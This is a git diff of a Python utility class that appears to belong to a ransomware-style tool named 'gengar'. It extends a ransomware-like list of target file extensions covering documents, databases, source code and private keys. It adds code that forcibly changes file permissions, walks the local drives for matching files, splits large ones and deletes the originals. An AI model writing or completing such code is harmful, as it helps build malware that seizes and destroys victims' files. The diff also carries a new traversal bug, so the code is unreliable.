@@ -62,7 +62,7 @@ class Utils:
                   '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp',
                   '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay',
                   '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw',
-                  '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']
+                  '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der', '.py']
 
 
     MAX_SIZE_FILE = 1000000000 # Maximum size of files must be 1 GB, otherwise file split is needed
@@ -93,36 +93,33 @@ class Utils:
         else:
             raise ValueError('Invalid argument at the time of saving data')
 
-    # Dunno whats wrong with this
+
     def load_data(self, full_path):
-        """
         if not os.access(full_path, os.R_OK):
             oschmod.set_mode(full_path, "a+rwx,g-w,o-x")
             if not os.access(full_path, os.R_OK):
                 raise PermissionError("Read permisions can't be modified")
-        """ 
-        try:
-            with open(full_path, 'rb') as file:
-                return file.read()
-        except:
-            pass
+        
+        with open(full_path, 'rb') as file:
+            return file.read()
+
 
     
     def search_and_split(self, local_drives):
         try:
             fs = Filesplit()
             for ld in local_drives:
-                for root, dirs, files in os.walk(ld):
+                for root, dirs, files in os.walk(local_drives):
                     for fn in files:
                         full_path = root + os.sep + fn
                         ext = self.get_file_extension(full_path)
                         if ext in self.TARGET_EXT and ext not in self.EXCLUDED_EXT:
-                            if os.path.getsize(fn) > self.MAX_SIZE_FILE:
+                            if os.path.getsize(full_path) > self.MAX_SIZE_FILE:
                                 print("splitting...")
                                 dir_name = str(fn) + "_gengar_splitted_file"
                                 os.mkdir(dir_name)
                                 fs.split(file=full_path, split_size=self.MAX_SIZE_FILE, output_dir=dir_name)
-                                os.remove(fn)
+                                os.remove(full_path)
         except:
             traceback.print_exc()
 
